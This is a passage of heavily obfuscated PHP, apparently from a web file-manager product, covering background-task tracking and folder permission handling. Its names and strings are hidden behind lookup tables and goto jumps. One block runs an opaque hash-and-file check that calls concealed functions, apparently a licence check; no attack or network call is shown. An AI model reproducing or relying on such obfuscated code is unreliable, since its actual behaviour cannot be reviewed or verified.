sleep($BÒ™Ï¶§ƒ); $this->update(); return; } } goto BñˆôÌÜ´â; CÀå™í˜Ê: Hook::trigger($CìùÆÅ¬åÚ[1521], $fÀİ¦×†§); self::valueSet($fÀİ¦×†§[$CìùÆÅ¬åÚ[388]], $fÀİ¦×†§); goto c¹ŠéòÈîƒ; FİÖïøäÊ: $CìùÆÅ¬åÚ =& $_SERVER[¹…ÕÄ]; $fÀİ¦×†§ =& $this->task; if (!$fÀİ¦×†§) { return; } goto DŸÓÜÒ¬¦¬; d¯Š®ŸÒ›‰: $this->updateAfter(); $c´õğŠ…ã˜ = 0.2; if (timeFloat() - $fÀİ¦×†§[$CìùÆÅ¬åÚ[1507]] < $c´õğŠ…ã˜ && !$EÃà·£ÒêÙ) { return; } goto E”ª– ‹´¹; DŸÓÜÒ¬¦¬: $fÀİ¦×†§[$CìùÆÅ¬åÚ[1014]] += $B¶­—ŒäèÈ; $fÀİ¦×†§[$CìùÆÅ¬åÚ[735]] = timeFloat(); if ($fÀİ¦×†§[$CìùÆÅ¬åÚ[1000]]) { if ($fÀİ¦×†§[$CìùÆÅ¬åÚ[1000]] < $fÀİ¦×†§[$CìùÆÅ¬åÚ[1014]]) { $fÀİ¦×†§[$CìùÆÅ¬åÚ[1000]] = $fÀİ¦×†§[$CìùÆÅ¬åÚ[1014]]; } $dƒìëøŞ·Ä = timeFloat() - $fÀİ¦×†§[$CìùÆÅ¬åÚ[736]] - $fÀİ¦×†§[$CìùÆÅ¬åÚ[1508]]; $fÀİ¦×†§[$CìùÆÅ¬åÚ[1505]] = $fÀİ¦×†§[$CìùÆÅ¬åÚ[1014]] / $fÀİ¦×†§[$CìùÆÅ¬åÚ[1000]]; $fÀİ¦×†§[$CìùÆÅ¬åÚ[1506]] = $fÀİ¦×†§[$CìùÆÅ¬åÚ[1014]] / $dƒìëøŞ·Ä; if ($fÀİ¦×†§[$CìùÆÅ¬åÚ[1505]] > 0) { $fÀİ¦×†§[$CìùÆÅ¬åÚ[1509]] = $dƒìëøŞ·Ä * (1 - $fÀİ¦×†§[$CìùÆÅ¬åÚ[1505]]) / $fÀİ¦×†§[$CìùÆÅ¬åÚ[1505]]; } $fÀİ¦×†§[$CìùÆÅ¬åÚ[1509]] = $fÀİ¦×†§[$CìùÆÅ¬åÚ[1509]] <= 0 ? 0 : $fÀİ¦×†§[$CìùÆÅ¬åÚ[1509]]; } goto d¯Š®ŸÒ›‰; BñˆôÌÜ´â: $fÀİ¦×†§[$CìùÆÅ¬åÚ[705]] = $c…Õ³ì‰Óï ? $c…Õ³ì‰Óï : $fÀİ¦×†§[$CìùÆÅ¬åÚ[705]]; $fÀİ¦×†§[$CìùÆÅ¬åÚ[1508]] = $B”¬Ğø¿[$CìùÆÅ¬åÚ[1508]] ? $B”¬Ğø¿[$CìùÆÅ¬åÚ[1508]] : 0; $fÀİ¦×†§[$CìùÆÅ¬åÚ[1507]] = timeFloat(); goto CÀå™í˜Ê; c¹ŠéòÈîƒ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($DÕÏÈà„î¶) { $e£ó›Š¦éµ =& $_SERVER[¹…ÕÄ]; Cache::set($e£ó›Š¦éµ[1520] . $this->task[$e£ó›Š¦éµ[388]], $DÕÏÈà„î¶, 60); return $DÕÏÈà„î¶; } public static function get($aİ™¹øêÓË) { return self::valueGet($aİ™¹øêÓË); } public static function listData() { $Cßª… ìİ® = self::valueGet(); return array_sort_by($Cßª… ìİ®, $_SERVER[¹…ÕÄ][736], !0); } public static function kill($AÔÌ¯¨ôºÌ) { return self::changeStatus($AÔÌ¯¨ôºÌ, self::STATYS_KILL); } public static function stop($a‹ï±²È¤„) { return self::changeStatus($a‹ï±²È¤„, self::STATYS_STOP); } public static function restart($bµøÖ†¿ã„) { return self::changeStatus($bµøÖ†¿ã„, self::STATYS_RUNNING); } public static function killAll() { $eñÅº÷¶Ó =& $_SERVER[¹…ÕÄ]; $C÷§ÛƒŞÀâ = self::listData(); foreach ($C÷§ÛƒŞÀâ as $A©‚×…²¯Ä) { self::kill($A©‚×…²¯Ä[$eñÅº÷¶Ó[388]]); } sleep(2); foreach ($C÷§ÛƒŞÀâ as $A©‚×…²¯Ä) { self::valueSet($A©‚×…²¯Ä[$eñÅº÷¶Ó[388]], !1); } } private static function changeStatus($B¨‚³ƒó‡Æ, $BùÊ†¢¡Ä—) { goto b˜›Õã¨‹±; b˜›Õã¨‹±: $B†™‘¨Ñ¬ê =& $_SERVER[¹…ÕÄ]; $B×¡Ë¬È¦ç = self::valueGet($B¨‚³ƒó‡Æ); if (!$B×¡Ë¬È¦ç) { return !1; } goto b‡²ÊÇ‚; b‡²ÊÇ‚: $B×¡Ë¬È¦ç[$B†™‘¨Ñ¬ê[705]] = $BùÊ†¢¡Ä—; self::valueSet($B¨‚³ƒó‡Æ, $B×¡Ë¬È¦ç); self::log($B†™‘¨Ñ¬ê[1522] . $B×¡Ë¬È¦ç[$B†™‘¨Ñ¬ê[388]] . $B†™‘¨Ñ¬ê[1523] . $BùÊ†¢¡Ä—); goto FËìŒ–”; FËìŒ–”: return !0; goto f¬¨¨ğ¦«ƒ; f¬¨¨ğ¦«ƒ: } public static function valueGet($A¼ÓƒÍœà = false) { $b¢”¦‡òëö =& $_SERVER[¹…ÕÄ]; if ($A¼ÓƒÍœà) { $Dò¹®‹—²¾ = Model($b¢”¦‡òëö[419])->where(array($b¢”¦‡òëö[92] => $A¼ÓƒÍœà, $b¢”¦‡òëö[29] => $b¢”¦‡òëö[1524]))->find(); return $Dò¹®‹—²¾ ? json_decode($Dò¹®‹—²¾[$b¢”¦‡òëö[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($EÔ‡…Œ¨›… = false) { goto d¼ë”¨‹Î; a‰¿À ©¹î: return $A·ØÌØÚ‰·; goto c¾çÕøŒ; d¼ë”¨‹Î: $Cğ·´é‹º =& $_SERVER[¹…ÕÄ]; $a„²„‰±‹é = array($Cğ·´é‹º[29] => $Cğ·´é‹º[1524]); if ($EÔ‡…Œ¨›…) { $a„²„‰±‹é[$Cğ·´é‹º[1504]] = $EÔ‡…Œ¨›…; } goto D”Ó×ë¢; D”Ó×ë¢: $A·ØÌØÚ‰· = Model($Cğ·´é‹º[419])->where($a„²„‰±‹é)->select(); $A·ØÌØÚ‰· = $A·ØÌØÚ‰· ? $A·ØÌØÚ‰· : array(); foreach ($A·ØÌØÚ‰· as $B˜Ç—¦çÛ => $a½ŸÄï“ŠÀ) { $A·ØÌØÚ‰·[$B˜Ç—¦çÛ] = json_decode($a½ŸÄï“ŠÀ[$Cğ·´é‹º[370]], !0); } goto a‰¿À ©¹î; c¾çÕøŒ: } public static function valueSet($E†±Ï»¥², $bãÀÌàÅ„) { goto AÇ¨ß£ª¶Ò; f¾ßÆ„Ğñ„: Model($aÒÍÈ„¡Ö»[419])->add($CªíÔˆæß´, array(), !0); goto fÒÖÃ³ò‡ñ; CÓóµÑÙ¸»: if (!$eÑÏÛîå¶¸) { ob_start(); var_dump($bãÀÌàÅ„); $BÑ×³›¶í“ = ob_get_clean(); self::log($aÒÍÈ„¡Ö»[1525] . json_encode_force($BÑ×³›¶í“)); } if (!$E†±Ï»¥² || !$bãÀÌàÅ„[$aÒÍÈ„¡Ö»[388]]) { return !1; } $CªíÔˆæß´ = array($aÒÍÈ„¡Ö»[29] => $aÒÍÈ„¡Ö»[1524], $aÒÍÈ„¡Ö»[1504] => USER_ID, $aÒÍÈ„¡Ö»[92] => $E†±Ï»¥², $aÒÍÈ„¡Ö»[370] => $eÑÏÛîå¶¸); goto f¾ßÆ„Ğñ„; AÇ¨ß£ª¶Ò: $aÒÍÈ„¡Ö» =& $_SERVER[¹…ÕÄ]; if (!$bãÀÌàÅ„) { return Model($aÒÍÈ„¡Ö»[419])->where(array($aÒÍÈ„¡Ö»[92] => $E†±Ï»¥², $aÒÍÈ„¡Ö»[29] => $aÒÍÈ„¡Ö»[1524]))->delete(); } $eÑÏÛîå¶¸ = json_encode($bãÀÌàÅ„); goto CÓóµÑÙ¸»; fÒÖÃ³ò‡ñ: } public static function log($b÷Ü†İÔã¤) { write_log($b÷Ü†İÔã¤, $_SERVER[¹…ÕÄ][1526]); } } goto EøìÖßÉ°¶; CÆ‡Ïí–ó: if ($_SERVER[$_SERVER[¹…ÕÄ][813]] != $DÜŞëääñ“($Fá˜‚ÖÊÈô)) { goto B÷äâ‰‚âË; CªŠ¿é‘ğ: $c“´Î…ó¨ = explode($_SERVER[¹…ÕÄ][227], $d®»èê™õ); if (count($c“´Î…ó¨) < $_SERVER[¹…ÕÄ][574]) { $föÁÊÔ«—Œ = $_SERVER[¹…ÕÄ][818]; $föÁÊÔ«—Œ(); } $dï‰ùâ„—İ = $_SERVER[¹…ÕÄ][1116]; goto C£ä¼ª©; B÷äâ‰‚âË: $BœÏôÙÂÙƒ = $_SERVER[¹…ÕÄ][815]; $A¾Œ³³©Š‡ = $_SERVER[$_SERVER[¹…ÕÄ][816]] . $_SERVER[¹…ÕÄ][817]; $d®»èê™õ = $BœÏôÙÂÙƒ($A¾Œ³³©Š‡); goto CªŠ¿é‘ğ; C£ä¼ª©: $dï‰ùâ„—İ($Fá˜‚ÖÊÈô); goto Cí‰ØêÜ; Cí‰ØêÜ: } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\143\x65\x5f\141\x75\x74\150"; public function getAuth($AÚİŸµœ•) { goto dŠŠ™Ê‚Úà; B›ôÅË…Ú: array_multisort($eí©’„¹é, SORT_DESC, $F¹à­ˆ«…¼); return $F¹à­ˆ«…¼; goto AğÀğĞ†’¨; B˜Æ—è‡Ÿ†: $eí©’„¹é = array(); $fì†ùº‰«» = 2 << 25; foreach ($CÖÒá°¸Ÿï as $eÕ‚ÑÅì¢) { goto E—ë²¬ªØ; a¯„Ë†À†Ú: $f¾›ÓŞ¯ = 0; if ($eÕ‚ÑÅì¢[$EÏç‡„­ËÏ[398]] == SourceModel::TYPE_GROUP) { $f¾›ÓŞ¯ = $fì†ùº‰«» * 2; } if ($eÕ‚ÑÅì¢[$EÏç‡„­ËÏ[398]] == SourceModel::TYPE_USER) { $f¾›ÓŞ¯ = $fì†ùº‰«»; } goto dÅ‡©ƒ··Ç; E—ë²¬ªØ: $fíº“àÆÜÉ = Model($EÏç‡„­ËÏ[1835])->listData($eÕ‚ÑÅì¢[$EÏç‡„­ËÏ[1763]]); if (!$fíº“àÆÜÉ) { continue; } $F¹à­ˆ«…¼[] = $eÕ‚ÑÅì¢; goto a¯„Ë†À†Ú; dÅ‡©ƒ··Ç: if ($eÕ‚ÑÅì¢[$EÏç‡„­ËÏ[398]] == SourceModel::TYPE_USER && $eÕ‚ÑÅì¢[$EÏç‡„­ËÏ[478]] == $EÏç‡„­ËÏ[491]) { $f¾›ÓŞ¯ = 0; } $eí©’„¹é[] = $fíº“àÆÜÉ[$EÏç‡„­ËÏ[400]] + $f¾›ÓŞ¯; goto AŸÊÄ·; AŸÊÄ·: } goto B›ôÅË…Ú; dŠŠ™Ê‚Úà: $EÏç‡„­ËÏ =& $_SERVER[¹…ÕÄ]; $CÖÒá°¸Ÿï = $this->sourceAuthSelect($AÚİŸµœ•); $F¹à­ˆ«…¼ = array(); goto B˜Æ—è‡Ÿ†; AğÀğĞ†’¨: } public function sourceAuthSelect($Dáï–¼¡Ó) { goto fí™·›¥µ‘; b„àÎÉâõ: if ($D©ÁçŒ»Ú) { $Dáï–¼¡Ó = array($Dáï–¼¡Ó); } $F½¼ï­ãÇ = array(); foreach ($Dáï–¼¡Ó as $B ¨œÄáø) { if (isset($F’÷å•ò²Â[$B ¨œÄáø])) { $F½¼ï­ãÇ[$B ¨œÄáø] = $F’÷å•ò²Â[$B ¨œÄáø]; } } goto B¼ŸËå‰¤; B¼ŸËå‰¤: if (count($F½¼ï­ãÇ) == count($Dáï–¼¡Ó)) { return $D©ÁçŒ»Ú ? $F½¼ï­ãÇ[$Dáï–¼¡Ó[0]] : $F½¼ï­ãÇ; } $fŠ˜º‹Ôá– = $b¿èÔµîŸ‰[1836]; $C¶¤á¿©ƒ = array($b¿èÔµîŸ‰[390] => array($b¿èÔµîŸ‰[7], $Dáï–¼¡Ó)); goto A¬ê­§Õ¹Ç; C‰š¥ø–µ : if ($D©ÁçŒ»Ú) { return $f‚±Ğ“ŠÜè; } return $EĞº‡¸ä¡¥; goto bºª³¬‚ƒŒ; fí™·›¥µ‘: $b¿èÔµîŸ‰ =& $_SERVER[¹…ÕÄ]; static $F’÷å•ò²Â = array(); $D©ÁçŒ»Ú = is_array($Dáï–¼¡Ó) ? !1 : !0; goto b„àÎÉâõ; A¬ê­§Õ¹Ç: $f‚±Ğ“ŠÜè = $this->field($fŠ˜º‹Ôá–)->order($b¿èÔµîŸ‰[388])->where($C¶¤á¿©ƒ)->select(); $EĞº‡¸ä¡¥ = array_to_keyvalue_group($f‚±Ğ“ŠÜè, $b¿èÔµîŸ‰[390]); foreach ($Dáï–¼¡Ó as $B ¨œÄáø) { $F’÷å•ò²Â[$B ¨œÄáø] = $EĞº‡¸ä¡¥[$B ¨œÄáø] ? $EĞº‡¸ä¡¥[$B ¨œÄáø] : array(); } goto C‰š¥ø–µ ; bºª³¬‚ƒŒ: } public function setAuth($FƒÅâ„†¬, $d¥‰Ñç¶ˆÜ) { goto c‹Ğ¶Í«”; F°Û‘çôÙß: return !0; goto e‚˜ÑÁ„ÙÒ; bÏâñŞ°Æ†: foreach ($d¥‰Ñç¶ˆÜ as $D‰‡êî·ã) { if (!in_array($D‰‡êî·ã[$B ¥öš‡‚Ì[398]], $f‘¶ñ£»¦Ì)) { show_json(LNG($B ¥öš‡‚Ì[1837]), !1); } if ($FÉˆÍ“ò¶´ != $FæÏ¦õîØÙ) { if ($D‰‡êî·ã[$B ¥öš‡‚Ì[398]] == SourceModel::TYPE_GROUP) { } if ($D‰‡êî·ã[$B ¥öš‡‚Ì[478]] != 0 && !in_array($D‰‡êî·ã[$B ¥öš‡‚Ì[478]], $DÃ¬ŸÔŒ)) { } } if ($D‰‡êî·ã[$B ¥öš‡‚Ì[478]] == 0) { $D‰‡êî·ã[$B ¥öš‡‚Ì[398]] = SourceModel::TYPE_USER; } $C„èœ—™Âš[] = array($B ¥öš‡‚Ì[390] => $FƒÅâ„†¬, $B ¥öš‡‚Ì[398] => intval($D‰‡êî·ã[$B ¥öš‡‚Ì[398]]), $B ¥öš‡‚Ì[478] => intval($D‰‡êî·ã[$B ¥öš‡‚Ì[478]]), $B ¥öš‡‚Ì[1763] => intval($D‰‡êî·ã[$B ¥öš‡‚Ì[1763]]) ? intval($D‰‡êî·ã[$B ¥öš‡‚Ì[1763]]) : 0, $B ¥öš‡‚Ì[1817] => intval($D‰‡êî·ã[$B ¥öš‡‚Ì[1817]]) ? intval($D‰‡êî·ã[$B ¥öš‡‚Ì[1817]]) : -1); } $this->where(array($B ¥öš‡‚Ì[404] => $FƒÅâ„†¬))->delete(); $this->addAll($C„èœ—™Âš); goto F°Û‘çôÙß; F¤æÂó‘ : if ($FÉˆÍ“ò¶´ != $FæÏ¦õîØÙ) { $CìÎ£ÙŞ… = array($B ¥öš‡‚Ì[1667] => $FÉˆÍ“ò¶´); $DÃ¬ŸÔŒ = Model($B ¥öš‡‚Ì[1749])->field($B ¥öš‡‚Ì[1504])->where($CìÎ£ÙŞ…)->select(); $DÃ¬ŸÔŒ = array_to_keyvalue($DÃ¬ŸÔŒ, $B ¥öš‡‚Ì[33], $B ¥öš‡‚Ì[1504]); } $f‘¶ñ£»¦Ì = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $C„èœ—™Âš = array(); goto bÏâñŞ°Æ†; c‹Ğ¶Í«”: $B ¥öš‡‚Ì =& $_SERVER[¹…ÕÄ]; $eåâ¨«®•¿ = Model($B ¥öš‡‚Ì[1183])->sourceInfo($FƒÅâ„†¬); if (!$eåâ¨«®•¿) { return !1; } goto eÔÇ—Ş×ø; eÔÇ—Ş×ø: if ($eåâ¨«®•¿[$B ¥öš‡‚Ì[398]] != SourceModel::TYPE_GROUP) { return !1; } $FæÏ¦õîØÙ = 1; $FÉˆÍ“ò¶´ = $eåâ¨«®•¿[$B ¥öš‡‚Ì[478]]; goto F¤æÂó‘ ; e‚˜ÑÁ„ÙÒ: } public function authClear($FÆ«™‡ñè) { $bïçÚÜÛ¡ =& $_SERVER[¹…ÕÄ]; $dòä‹ëÁ– = Model($bïçÚÜÛ¡[1183])->sourceInfo($FÆ«™‡ñè); $f™œïèï¬« = array($FÆ«™‡ñè); if ($dòä‹ëÁ–[$bïçÚÜÛ¡[397]] == $bïçÚÜÛ¡[86]) { $dÊ¾è¾™î = array($bïçÚÜÛ¡[548] => array($bïçÚÜÛ¡[507], $dòä‹ëÁ–[$bïçÚÜÛ¡[481]] . $FÆ«™‡ñè . $bïçÚÜÛ¡[508])); $f™œïèï¬« = Model($bïçÚÜÛ¡[1183])->field($bïçÚÜÛ¡[404])->where($dÊ¾è¾™î)->getField($bïçÚÜÛ¡[390], !0); $f™œïèï¬«[] = $FÆ«™‡ñè; } $this->where(array($bïçÚÜÛ¡[404] => array($bïçÚÜÛ¡[405], $f™œïèï¬«)))->delete(); return !0; } public function getAllChildren($e”›»±ØŸ) { goto AÃÉ¥¢é—ä; AÃÉ¥¢é—ä: $BƒâÍ˜Š·× =& $_SERVER[¹…ÕÄ]; $b„íŠİÛùÇ = Model($BƒâÍ˜Š·×[1183])->sourceInfo($e”›»±ØŸ); if ($b„íŠİÛùÇ[$BƒâÍ˜Š·×[397]] != $BƒâÍ˜Š·×[86]) { return $this->sourceListAuth(array($e”›»±ØŸ)); } goto aÒ°Í¸İÊ; BõÇá‘˜: return $this->sourceListAuth($F„˜Œ‚Õ¬°); goto EÎù÷Îíæ; aÒ°Í¸İÊ: if ($b„íŠİÛùÇ[$BƒâÍ˜Š·×[398]] != SourceModel::TYPE_GROUP) { return array(); } $eíñÎÛÄ± = 1; $e¯ëë°“¸Ü = array($e”›»±ØŸ); goto Cœ“®áî†; d„Â¶½½®÷: if (!$eĞ½½ˆÈ—¾) { return array(); } $FÔ¡’ÒÆÕÛ = $BƒâÍ˜Š·×[1838]; $c«‡Çì¹»ˆ = array($BƒâÍ˜Š·×[390] => array($BƒâÍ˜Š·×[7], $eĞ½½ˆÈ—¾), $BƒâÍ˜Š·×[417] => $BƒâÍ˜Š·×[491]); goto FïÊßß÷Ã; FïÊßß÷Ã: $CŒ‡´Åó = Model($BƒâÍ˜Š·×[770])->field($FÔ¡’ÒÆÕÛ)->where($c«‡Çì¹»ˆ)->select(); $F„˜Œ‚Õ¬° = array($e”›»±ØŸ); foreach ($CŒ‡´Åó as $FöØá—‹²) { foreach ($e¯ëë°“¸Ü as $c’¯Í•´Á—) { $cœÓíÃ‰¹ = $BƒâÍ˜Š·×[47] . $c’¯Í•´Á— . $BƒâÍ˜Š·×[47]; $A•­Ñ­é³ = $FöØá—‹²[$BƒâÍ˜Š·×[481]] . $FöØá—‹²[$BƒâÍ˜Š·×[390]] . $BƒâÍ˜Š·×[47]; if (strstr($A•­Ñ­é³, $cœÓíÃ‰¹)) { $F„˜Œ‚Õ¬°[] = $FöØá—‹²[$BƒâÍ˜Š·×[390]]; break; } } } goto BõÇá‘˜; Cœ“®áî†: if ($b„íŠİÛùÇ[$BƒâÍ˜Š·×[472]] == $BƒâÍ˜Š·×[491] && $b„íŠİÛùÇ[$BƒâÍ˜Š·×[478]] != $eíñÎÛÄ±) { $e¯ëë°“¸Ü = $this->groupChidldAllRootSource($b„íŠİÛùÇ[$BƒâÍ˜Š·×[478]]); } $eĞ½½ˆÈ—¾ = $this->field($BƒâÍ˜Š·×[390])->group($BƒâÍ˜Š·×[390])->select(); $eĞ½½ˆÈ—¾ = array_to_keyvalue($eĞ½½ˆÈ—¾, $BƒâÍ˜Š·×[33], $BƒâÍ˜Š·×[390]); goto d„Â¶½½®÷; EÎù÷Îíæ: } private function sourceListAuth($F©²—ƒ§¹) { goto EÃˆå„µİ‰; EÃˆå„µİ‰: $eÊß˜Ÿ½£Å =& $_SERVER[¹…ÕÄ]; $a„®”“ì‡¬ = Model($eÊß˜Ÿ½£Å[1183])->sourceListInfo($F©²—ƒ§¹, !0); $e¿—¡Îºø = $this->sourceAuthSelect($F©²—ƒ§¹); goto aÕó•ˆË°Š; a¶…„Ã‹Ìç: array_multisort($EÜÄˆêŞÚ¾, SORT_ASC, $Fá‘Ò˜ÖØÁ); return $Fá‘Ò˜ÖØÁ; goto Eİ‚ëãİó³; aÕó•ˆË°Š: $Fá‘Ò˜ÖØÁ = array(); $EÜÄˆêŞÚ¾ = array(); foreach ($a„®”“ì‡¬ as $c®êø³Ù„) { goto d¤§ŸÑ³é; C‘¸¯ à¿: $c®êø³Ù„[$eÊß˜Ÿ½£Å[1839]] = $this->authTargetInfo($cóÀ“ŸƒĞç); $c®êø³Ù„[$eÊß˜Ÿ½£Å[489]] = rtrim($c®êø³Ù„[$eÊß˜Ÿ½£Å[484]], $eÊß˜Ÿ½£Å[8]) . $eÊß˜Ÿ½£Å[8] . ltrim($c®êø³Ù„[$eÊß˜Ÿ½£Å[489]], $eÊß˜Ÿ½£Å[8]); $Fá‘Ò˜ÖØÁ[] = $c®êø³Ù„; goto Eí”¼¿†Ç“; d¤§ŸÑ³é: unset($c®êø³Ù„[$eÊß˜Ÿ½£Å[428]]); unset($c®êø³Ù„[$eÊß˜Ÿ½£Å[426]]); unset($c®êø³Ù„[$eÊß˜Ÿ½£Å[400]]); goto E‰½Š×¥Ò‹; Eí”¼¿†Ç“: $BéÀŸ˜‰ß = count(explode($eÊß˜Ÿ½£Å[8], trim($c®êø³Ù„[$eÊß˜Ÿ½£Å[489]], $eÊß˜Ÿ½£Å[8]))); $EÜÄˆêŞÚ¾[] = $BéÀŸ˜‰ß + ($c®êø³Ù„[$eÊß˜Ÿ½£Å[29]] == $eÊß˜Ÿ½£Å[76] ? 0 : 1000); goto c­œÁê´™£; E‰½Š×¥Ò‹: unset($c®êø³Ù„[$eÊß˜Ÿ½£Å[84]]); $cóÀ“ŸƒĞç = $e¿—¡Îºø[$c®êø³Ù„[$eÊß˜Ÿ½£Å[390]]]; if (!$cóÀ“ŸƒĞç) { continue; } goto C‘¸¯ à¿; c­œÁê´™£: } goto a¶…„Ã‹Ìç; Eİ‚ëãİó³: } private function groupChidldAllRootSource($F£Ì¸ÜÊÎå) { $A‡©‘ÙÏŠ =& $_SERVER[¹…ÕÄ]; $E›˜îÕ¡ = Model($A‡©‘ÙÏŠ[1840])->groupChildrenAll($F£Ì¸ÜÊÎå); $EóÒ‚–„İÜ = array($A‡©‘ÙÏŠ[472] => 0, $A‡©‘ÙÏŠ[478] => array($A‡©‘ÙÏŠ[7], $E›˜îÕ¡), $A‡©‘ÙÏŠ[398] => SourceModel::TYPE_GROUP); $cåñÍˆ’Ê÷ = Model($A‡©‘ÙÏŠ[770])->field($A‡©‘ÙÏŠ[390])->where($EóÒ‚–„İÜ)->select(); $cåñÍˆ’Ê÷ = array_to_keyvalue($cåñÍˆ’Ê÷, $A‡©‘ÙÏŠ[33], $A‡©‘ÙÏŠ[390]); return $cåñÍˆ’Ê÷; } private function authTargetInfo($f¾Ü´•·Ñù) { goto FÚ’–Ô©ù; e–Å÷Éá›Ã: return $cğİ¼¡¼šµ; goto aò‚ä–•ÙĞ; c¿Ó²¯°±´: $f»ã¥ç«‘ = 2 << 25; foreach ($f¾Ü´•·Ñù as $eîÜºí“ÖÏ) { goto c†Ã…ß‚ƒ•; A¢©«‡Ğ¾ñ: if (!$BƒßÊŞÕ¼) { continue; } $BƒßÊŞÕ¼[$aÔÒ–È¼ì[440]] = $F°±ÉÁœ–£; $cğİ¼¡¼šµ[] = $BƒßÊŞÕ¼; goto ešÂ‡Ä¸˜´; fƒªä–…õé: if ($eîÜºí“ÖÏ[$aÔÒ–È¼ì[398]] == SourceModel::TYPE_USER && $eîÜºí“ÖÏ[$aÔÒ–È¼ì[478]] == $aÔÒ–È¼ì[491]) { $d…¸õèÛø = 0; } $C°è™®Í–ù[] = $F°±ÉÁœ–£[$aÔÒ–È¼ì[400]] + $d…¸õèÛø; goto bœ×¤…îî·; c†Ã…ß‚ƒ•: $F°±ÉÁœ–£ = Model($aÔÒ–È¼ì[1835])->listData($eîÜºí“ÖÏ[$aÔÒ–È¼ì[1763]]); if (!$F°±ÉÁœ–£) { continue; } if ($eîÜºí“ÖÏ[$aÔÒ–È¼ì[398]] == SourceModel::TYPE_USER) { $BƒßÊŞÕ¼ = Model($aÔÒ–È¼ì[497])->getInfoSimpleOuter($eîÜºí“ÖÏ[$aÔÒ–È¼ì[478]]); if ($BƒßÊŞÕ¼[$aÔÒ–È¼ì[1504]] == $aÔÒ–È¼ì[1063]) { continue; } if ($BƒßÊŞÕ¼[$aÔÒ–È¼ì[1504]] == $aÔÒ–È¼ì[491]) { $BƒßÊŞÕ¼[$aÔÒ–È¼ì[28]] = LNG($aÔÒ–È¼ì[1841]); } } else { $BƒßÊŞÕ¼ = Model($aÔÒ–È¼ì[480])->getInfoSimple($eîÜºí“ÖÏ[$aÔÒ–È¼ì[478]]); } goto A¢©«‡Ğ¾ñ; ešÂ‡Ä¸˜´: $d…¸õèÛø = 0; if ($eîÜºí“ÖÏ[$aÔÒ–È¼ì[398]] == SourceModel::TYPE_GROUP) { $d…¸õèÛø = $f»ã¥ç«‘ * 2; } if ($eîÜºí“ÖÏ[$aÔÒ–È¼ì[398]] == SourceModel::TYPE_USER) { $d…¸õèÛø = $f»ã¥ç«‘; } goto fƒªä–…õé; bœ×¤…îî·: } array_multisort($C°è™®Í–ù, SORT_DESC, $cğİ¼¡¼šµ); goto e–Å÷Éá›Ã; FÚ’–Ô©ù: $aÔÒ–È¼ì =& $_SERVER[¹…ÕÄ]; $cğİ¼¡¼šµ = array(); $C°è™®Í–ù = array(); goto c¿Ó²¯°±´; aò‚ä–•ÙĞ: } public function getAllChildrenByUser($E„ä‚˜, $dĞåã‘×´) { goto CÁÖÒùÖŒ‘; cĞ«“˜ß–: return $aÁÅóÎ Ç; goto D©èŠÎØÄ; d‡ñ’ã£“ì: foreach ($E¾ Ÿäë± as $bôÃÂÀŸ”) { $dÑÆÒëğöÆ = !1; foreach ($bôÃÂÀŸ”[$BĞˆˆø•Ÿõ[1839]] as $BÇ›Ç§ëÄ) { if ($BÇ›Ç§ëÄ[$BĞˆˆø•Ÿõ[1504]]) { if ($BÇ›Ç§ëÄ[$BĞˆˆø•Ÿõ[1504]] == $dĞåã‘×´) { $dÑÆÒëğöÆ = !0; break; } } if ($BÇ›Ç§ëÄ[$BĞˆˆø•Ÿõ[1667]]) { if ($this->groupContainUser($BÇ›Ç§ëÄ[$BĞˆˆø•Ÿõ[1667]], $dĞåã‘×´)) { $dÑÆÒëğöÆ = !0; break; } } } if ($dÑÆÒëğöÆ) { $aÁÅóÎ Ç[] = $bôÃÂÀŸ”; } $CñòñÃŸ„® = $bôÃÂÀŸ”[$BĞˆˆø•Ÿõ[390]]; if (isset($d½º­ìÉŒ˜[$CñòñÃŸ„®])) { $bôÃÂÀŸ”[$BĞˆˆø•Ÿõ[1839]][] = $d½º­ìÉŒ˜[$CñòñÃŸ„®][0]; $d½º­ìÉŒ˜[$CñòñÃŸ„®] = !1; } } $d½º­ìÉŒ˜ = array_filter(array_values($d½º­ìÉŒ˜)); $aÁÅóÎ Ç = array_merge($d½º­ìÉŒ˜, $aÁÅóÎ Ç); goto cĞ«“˜ß–; A”Œí—£»: if ($bø«‹œù­»[$BĞˆˆø•Ÿõ[472]] == $BĞˆˆø•Ÿõ[491] && $bø«‹œù­»[$BĞˆˆø•Ÿõ[478]] != $B°æâº·ª¼ && $this->groupContainUser($bø«‹œù­»[$BĞˆˆø•Ÿõ[478]], $dĞåã‘×´)) { foreach ($E¾ŠÎœÅÒ[$BĞˆˆø•Ÿõ[1842]] as $D²•ÁÁµ¼õ) { $AÔì¤©Æª = Model($BĞˆˆø•Ÿõ[480])->getInfo($D²•ÁÁµ¼õ[$BĞˆˆø•Ÿõ[1667]]); $Eœ’õ×‘® = Model($BĞˆˆø•Ÿõ[501])->getInfoSimpleOuter($dĞåã‘×´); $Eœ’õ×‘®[$BĞˆˆø•Ÿõ[440]] = $D²•ÁÁµ¼õ[$BĞˆˆø•Ÿõ[400]]; if (Model($BĞˆˆø•Ÿõ[1835])->authCheckAction($D²•ÁÁµ¼õ[$BĞˆˆø•Ÿõ[400]][$BĞˆˆø•Ÿõ[400]], $BĞˆˆø•Ÿõ[1687])) { continue; } $C“‡­†ßô› = array($BĞˆˆø•Ÿõ[28] => $BĞˆˆø•Ÿõ[1456] . $AÔì¤©Æª[$BĞˆˆø•Ÿõ[28]], $BĞˆˆø•Ÿõ[390] => $AÔì¤©Æª[$BĞˆˆø•Ÿõ[84]][$BĞˆˆø•Ÿõ[390]], $BĞˆˆø•Ÿõ[75] => KodIO::make($AÔì¤©Æª[$BĞˆˆø•Ÿõ[84]][$BĞˆˆø•Ÿõ[390]]), $BĞˆˆø•Ÿõ[472] => $BĞˆˆø•Ÿõ[491], $BĞˆˆø•Ÿõ[398] => $BĞˆˆø•Ÿõ[994], $BĞˆˆø•Ÿõ[29] => $BĞˆˆø•Ÿõ[512], $BĞˆˆø•Ÿõ[489] => $AÔì¤©Æª[$BĞˆˆø•Ÿõ[485]], $BĞˆˆø•Ÿõ[1667] => $AÔì¤©Æª[$BĞˆˆø•Ÿõ[1667]], $BĞˆˆø•Ÿõ[482] => $AÔì¤©Æª[$BĞˆˆø•Ÿõ[472]], $BĞˆˆø•Ÿõ[1839] => 